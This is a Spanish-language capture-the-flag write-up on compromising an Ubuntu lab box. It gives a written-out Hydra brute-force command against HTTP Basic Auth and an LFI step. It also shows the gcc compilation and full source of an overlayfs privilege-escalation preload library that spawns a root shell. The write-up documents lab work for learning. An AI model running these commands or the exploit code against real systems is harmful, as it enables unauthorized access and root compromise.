### Ubuntu Goat - Stage 1 (120 Points) + Stage 2 (160 Points)
#### Stage 1: Find an ubuntu box named goat and gain a goat shell on it, then look for the flag. You may not need root privileges for that :D.
#### Stage 2: Gather root privileges on the ubuntu goat box.

##### Category: Hacking + Exploiting
##### Solves: 1




Esta máquina (192.168.0.21) consistía en un sistema Ubuntu, el cual entre los servicios ofrecidos contenía un servidor web en el puerto 80.

Al buscar potenciales archivos y directorios comunes que pudieran existir en el servidor web con la herramienta “dirb” se identificó el directorio “administration”, el cual solicitaba un usuario y contraseña a través de un panel de login Basic Authentication.

Tras probar varias contraseñas por defecto (admin/admin, test/test, admin/passsword, etc.) sin éxito, se decidió automatizar un ataque de diccionario para intentar conseguir unas credenciales válidas.

Para ello se utilizó la herramienta “THC Hydra” y el diccionario “rockyou.txt”:
	hydra -l admin -P /diccionarios/rockyou.txt 192.168.0.21 http-get "/administration"

Tras un rato, se consiguieron unas credenciales válidas (“admin/pirata”) y se pudo acceder al contenido del directorio web.

Una vez autenticados, se identificó una vulnerabilidad LFI (Local File Inclusion) en uno de los recursos web que permitían mostrar el contenido de distintos archivos locales del sistema:

![goat_lfi1](https://user-images.githubusercontent.com/38633962/42778689-3b4a7936-893e-11e8-8e6a-2608b381e594.png)

Tras buscar diversos archivos que nos permitieran acceso al flag (o a información sensible) sin éxito, se decidió intentar acceder al sistema a través de SSH con algunos de los usuarios identificados en el sistema:

![goat_lfi2](https://user-images.githubusercontent.com/38633962/42778801-93824034-893e-11e8-97fe-9c275412cc7d.png)

Tras varios intentos, se consiguió acceso al sistema con el usuario “flag” (con contraseña “flag”), el cual no poseía permisos de administración ni estaba incluido en el sudoers.

Una vez dentro del sistema y tras analizar los archivos existentes, se identificó el archivo “flag.g” dentro de la carpeta personal del usuario “goat” (“/home/goat/”), el cual parecía ser el flag de la primera parte del reto cifrado con GPG.

![goat_flag1](https://user-images.githubusercontent.com/38633962/42778825-a91ed9d4-893e-11e8-8365-6a1964fbeabe.png)

Puesto que la segunda parte del reto consistía en obtener privilegios de root en el sistema y tras probar de descifrar el flag con algunas posibles contraseñas sin éxito, se decidió intentar escalar privilegios y ver si así conseguíamos alguna pista más para descifrar este flag (como por ejemplo accediendo al history del usuario goat).

Después de haber buscado configuraciones o permisos inseguros que pudieran permitir una escalada de privilegios y analizar el sistema operativo (Ubuntu 12.04 con Kernel 3.13) se decidió utilizar algún exploit público que permitiese escalar privilegios, en concreto “https://www.exploit-db.com/exploits/37292/”.

Debido a que el sistema no disponía de gcc, se tuvo que compilar en local el código del exploit y la librería dinámica requerida (realizando la compilación para sistemas de 32 bits). Para ello se modificó la parte del exploit que generaba la librería dinámica automáticamente para generarla nosotros manualmente:

  · Compilación del exploit: 
     
    gcc -m32 37292.c -o exp2
  
  · Generación de la librería dinámica: 
  
    gcc -fPIC -shared -o ofs-lib.so ofs-lib.c -ldl -w -m32
  
  · Source code de ofs-lib.c:
  
```  
#include <unistd.h>
uid_t(*_real_getuid) (void);
char path[128];
uid_t
getuid(void){
	_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, "getuid");
	readlink("/proc/self/exe", (char *) &path, 128);
	if(geteuid() == 0 && !strcmp(path, "/bin/su")) {
		unlink("/etc/ld.so.preload");unlink("/tmp/ofs-lib.so");
		setresuid(0, 0, 0);
		setresgid(0, 0, 0);
		execle("/bin/sh", "sh", "-i", NULL, NULL);
	}
	return _real_getuid();
}
```

Una vez compilados el exploit y la librería dinámica, se copiaron en un servidor web, se descargaron en el servidor remoto a través de wget (utilizando la conexión ssh) y tras su ejecución se obtuvieron permisos de root :)

Siendo ya root en el sistema, fue trivial obtener el flag de la segunda parte del reto, ya que se encontraba en la carpeta personal del mismo:

![goat_root1](https://user-images.githubusercontent.com/38633962/42779069-87857dd6-893f-11e8-8471-9199430ed5ab.png)

Para identificar el flag de la primera parte, se analizó el history del usuario root y se identificaron las siguientes líneas, en las cuales se podía ver como se generaba el flag cifrado:

![goat_history1](https://user-images.githubusercontent.com/38633962/42779090-a5bcd8e4-893f-11e8-9fd1-7e05f91b79e8.png)

Así que para conocer el flag que validaba el reto sin necesidad de conocer la clave de cifrado era suficiente con generar el md5 de la palabra “patata”:

<code>$echo -n "patata" | md5sum</code>  → 35bc8cec895861697a0243c1304c7789

**Nota:** Puesto que tenía curiosidad por la clave utilizada para cifrar el flag de la primera parte, una vez acabado el CTF realicé alguna automatización y descubrí que la clave era “overdrive”, por lo que tampoco era tan difícil obtenerla sin escalar privilegios ^^

![goat_flag2](https://user-images.githubusercontent.com/38633962/42779143-cccbe5d8-893f-11e8-9641-c7b547dbb946.png)
